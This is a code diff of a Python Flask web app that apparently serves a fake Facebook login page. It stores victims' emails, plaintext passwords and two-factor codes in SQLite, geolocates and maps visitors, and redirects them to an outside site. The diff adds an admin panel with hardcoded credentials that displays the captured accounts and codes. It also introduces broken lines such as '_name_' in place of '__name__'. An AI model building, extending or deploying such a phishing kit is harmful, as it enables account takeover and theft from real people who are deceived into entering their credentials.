@@ -9,6 +9,7 @@ import os
 # ========================
 # Logging Setup
 # ========================
+
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s | %(levelname)s | %(message)s"
@@ -17,10 +18,18 @@ logging.basicConfig(
 logging.info("SERVER STARTED")
 
 # ========================
+# Database Path
+# ========================
+
+DB_PATH = os.path.join(os.getcwd(), "database.db")
+
+# ========================
 # إنشاء قاعدة البيانات
 # ========================
+
 def init_db():
-    conn = sqlite3.connect("database.db")
+
+    conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
 
     cursor.execute("""
@@ -74,16 +83,21 @@ init_db()
 # ========================
 # Flask
 # ========================
-app = Flask(__name__)
+
+app = Flask(_name_)
 app.secret_key = "secret123"
 
 # ========================
 # استخراج IP الحقيقي
 # ========================
+
 def get_real_ip():
+
     ip = request.headers.get("X-Forwarded-For")
+
     if not ip:
         ip = request.headers.get("X-Real-IP")
+
     if not ip:
         ip = request.remote_addr
 
@@ -95,66 +109,80 @@ def get_real_ip():
 # ========================
 # تحديد الموقع
 # ========================
+
 def get_location(ip):
+
     try:
+
         url = f"https://ipapi.co/{ip}/json/"
         response = requests.get(url, timeout=3)
+
+        if response.status_code != 200:
+            return "Unknown","Unknown","Unknown",None,None
+
         data = response.json()
 
-        country = data.get("country_name", "Unknown")
-        city = data.get("city", "Unknown")
-        isp = data.get("org", "Unknown")
-        lat = data.get("latitude", None)
-        lon = data.get("longitude", None)
+        country = data.get("country_name","Unknown")
+        city = data.get("city","Unknown")
+        isp = data.get("org","Unknown")
+        lat = data.get("latitude",None)
+        lon = data.get("longitude",None)
 
-        return country, city, isp, lat, lon
+        return country,city,isp,lat,lon
 
     except Exception as e:
+
         logging.error(f"Location API error: {e}")
-        return None, None, None, None, None
+        return None,None,None,None,None
 
 # ========================
 # تسجيل كل request
 # ========================
+
 @app.before_request
 def log_every_request():
 
-    if request.path in ["/ping", "/favicon.ico"]:
+    if request.path.startswith("/ping") or request.path.startswith("/favicon"):
         return
 
     ip = get_real_ip()
-    country, city, isp, lat, lon = get_location(ip)
+
+    country,city,isp,lat,lon = get_location(ip)
 
     path = request.path
     method = request.method
-    user_agent = request.headers.get("User-Agent", "").lower()
+    user_agent = request.headers.get("User-Agent","").lower()
     time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
     if "facebookexternalhit" in user_agent:
+
         visitor_type = "Facebook Bot"
         logging.warning("Facebook bot detected")
 
     elif "uptimerobot" in user_agent:
+
         visitor_type = "UptimeRobot"
         logging.info("UptimeRobot ping")
 
     elif "bot" in user_agent or "crawl" in user_agent:
+
         visitor_type = "Other Bot"
         logging.warning("Other bot detected")
 
     else:
+
         visitor_type = "Real User"
         logging.info("Real user visit")
 
     logging.info(f"{method} {path} | {ip} | {country} | {city}")
 
-    conn = sqlite3.connect("database.db")
+    conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
 
     cursor.execute("""
-    INSERT INTO visits (ip, country, city, isp, path, method, user_agent, visitor_type, time, lat, lon)
-    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-    """, (ip, country, city, isp, path, method, user_agent, visitor_type, time, lat, lon))
+    INSERT INTO visits (ip,country,city,isp,path,method,user_agent,visitor_type,time,lat,lon)
+    VALUES (?,?,?,?,?,?,?,?,?,?,?)
+    """,(ip,country,city,isp,path,method,user_agent,visitor_type,time,lat,lon))
 
     conn.commit()
     conn.close()
@@ -162,36 +190,42 @@ def log_every_request():
 # ========================
 # favicon
 # ========================
+
 @app.route('/favicon.ico')
 def favicon():
-    return send_from_directory('static', 'favicon.ico')
+    return send_from_directory('static','favicon.ico')
 
 # ========================
 # ping
 # ========================
+
 @app.route("/ping")
 def ping():
     logging.info("Ping request received")
-    return "OK", 200
+    return "OK",200
 
 # ========================
 # الصفحة الرئيسية
 # ========================
+
 @app.route("/")
 def home():
+
     logging.info("Homepage opened")
+
     return render_template("FacebookForm.html")
 
 # ========================
 # detect device
 # ========================
+
 def detect_device(user_agent):
 
     ua = user_agent.lower()
 
     if "android" in ua or "iphone" in ua:
         device = "Mobile Phone"
-    elif "ipad" in ua or "tablet" in ua:
+    elif "ipad" in ua:
         device = "Tablet"
     else:
         device = "Computer"
@@ -200,10 +234,8 @@ def detect_device(user_agent):
         os_name = "Windows"
     elif "android" in ua:
         os_name = "Android"
-    elif "iphone" in ua or "ios" in ua:
+    elif "iphone" in ua:
         os_name = "iOS"
-    elif "mac" in ua:
-        os_name = "MacOS"
     else:
         os_name = "Unknown"
 
@@ -216,12 +248,13 @@ def detect_device(user_agent):
     else:
         browser = "Unknown"
 
-    return device, os_name, browser
+    return device,os_name,browser
 
 # ========================
 # login
 # ========================
-@app.route("/login", methods=["POST"])
+
+@app.route("/login",methods=["POST"])
 def login():
 
     username = request.form.get("username")
@@ -230,68 +263,116 @@ def login():
     logging.warning(f"Login attempt | user: {username}")
 
     ip = get_real_ip()
-    user_agent = request.headers.get("User-Agent", "Unknown")
+    user_agent = request.headers.get("User-Agent","Unknown")
 
-    device, os_name, browser = detect_device(user_agent)
+    device,os_name,browser = detect_device(user_agent)
     time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    conn = sqlite3.connect("database.db")
+    conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
 
     cursor.execute("""
-    INSERT INTO users (email, password, ip, device, os, browser, time)
-    VALUES (?, ?, ?, ?, ?, ?, ?)
-    """, (username, password, ip, device, os_name, browser, time))
+    INSERT INTO users (email,password,ip,device,os,browser,time)
+    VALUES (?,?,?,?,?,?,?)
+    """,(username,password,ip,device,os_name,browser,time))
 
     conn.commit()
     conn.close()
 
-    login_url = "https://2742404919047.sarhne.com"
-    logging.info("User redirected")
-
-    return redirect(login_url)
+    return redirect("https://2742404919047.sarhne.com")
 
 # ========================
 # verify_code
 # ========================
-@app.route("/verify_code", methods=["POST"])
+
+@app.route("/verify_code",methods=["POST"])
 def verify_code():
 
     code = request.form.get("code")
-    phone_or_email = session.get("phone_or_email", "Unknown")
+    phone_or_email = session.get("phone_or_email","Unknown")
 
     ip = get_real_ip()
-    user_agent = request.headers.get("User-Agent", "Unknown")
+    user_agent = request.headers.get("User-Agent","Unknown")
 
-    device, os_name, browser = detect_device(user_agent)
+    device,os_name,browser = detect_device(user_agent)
     time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    conn = sqlite3.connect("database.db")
+    conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
 
     cursor.execute("""
-    INSERT INTO codes (email, code, ip, device, os, browser, time)
-    VALUES (?, ?, ?, ?, ?, ?, ?)
-    """, (phone_or_email, code, ip, device, os_name, browser, time))
+    INSERT INTO codes (email,code,ip,device,os,browser,time)
+    VALUES (?,?,?,?,?,?,?)
+    """,(phone_or_email,code,ip,device,os_name,browser,time))
 
     conn.commit()
     conn.close()
 
     logging.warning(f"Verification code captured: {code}")
 
-    login_url = "https://2742404919047.sarhne.com"
-    return redirect(login_url)
+    return redirect("https://2742404919047.sarhne.com")
 
 # ========================
-# Admin
+# ADMIN LOGIN
 # ========================
+
+@app.route("/admin_login",methods=["GET","POST"])
+def admin_login():
+
+    if request.method == "POST":
+
+        username = request.form.get("username")
+        password = request.form.get("password")
+
+        if username == "Hasan@RR" and password == "RafifIsMyLove":
+
+            session["admin"] = True
+            logging.warning("Admin logged in")
+
+            return redirect("/admin")
+
+        else:
+
+            logging.warning("Failed admin login attempt")
+
+    return """
+    <h2>Admin Login</h2>
+
+    <form method="POST">
+
+    <input name="username" placeholder="Username"><br><br>
+
+    <input name="password" type="password" placeholder="Password"><br><br>
+
+    <button type="submit">Login</button>
+
+    </form>
+    """
+
+# ========================
+# ADMIN LOGOUT
+# ========================
+
+@app.route("/admin_logout")
+def admin_logout():
+
+    session.pop("admin",None)
+
+    logging.info("Admin logged out")
+
+    return redirect("/admin_login")
+
+# ========================
+# ADMIN PANEL
+# ========================
+
 @app.route("/admin")
 def admin():
 
     if not session.get("admin"):
         return redirect("/admin_login")
 
-    conn = sqlite3.connect("database.db")
+    conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
 
     cursor.execute("SELECT * FROM visits")
@@ -312,28 +393,49 @@ def admin():
 
     html += "</table>"
 
+    html += "<h2>Users</h2><table border='1'>"
+
+    for user in users:
+        html += "<tr>" + "".join(f"<td>{col}</td>" for col in user) + "</tr>"
+
+    html += "</table>"
+
+    html += "<h2>Codes</h2><table border='1'>"
+
+    for code in codes:
+        html += "<tr>" + "".join(f"<td>{col}</td>" for col in code) + "</tr>"
+
+    html += "</table>"
+
     return html
 
 # ========================
-# map
+# MAP
 # ========================
+
 @app.route("/map")
 def map_view():
 
-    conn = sqlite3.connect("database.db")
+    conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
 
-    cursor.execute("SELECT ip, city, country, visitor_type, lat, lon FROM visits WHERE lat IS NOT NULL AND lon IS NOT NULL")
+    cursor.execute("""
+    SELECT ip,city,country,visitor_type,lat,lon
+    FROM visits
+    WHERE lat IS NOT NULL AND lon IS NOT NULL
+    """)
+
     visits = cursor.fetchall()
 
     conn.close()
 
-    m = folium.Map(location=[20,0], zoom_start=3)
+    m = folium.Map(location=[20,0],zoom_start=3)
 
-    for ip, city, country, visitor_type, lat, lon in visits:
+    for ip,city,country,visitor_type,lat,lon in visits:
+
         folium.Marker(
-            location=[lat, lon],
-            popup=f"{ip} | {city}, {country} | {visitor_type}"
+            location=[lat,lon],
+            popup=f"{ip} | {city},{country} | {visitor_type}"
         ).add_to(m)
 
     return m._repr_html_()
@@ -341,10 +443,11 @@ def map_view():
 # ========================
 # تشغيل السيرفر
 # ========================
-if __name__ == "__main__":
 
-    port = int(os.environ.get("PORT", 5000))
+if _name_ == "_main_":
+
+    port = int(os.environ.get("PORT",5000))
 
     logging.info(f"Server running on port {port}")
 
-    app.run(host="0.0.0.0", port=port)
+    app.run(host="0.0.0.0",port=port)
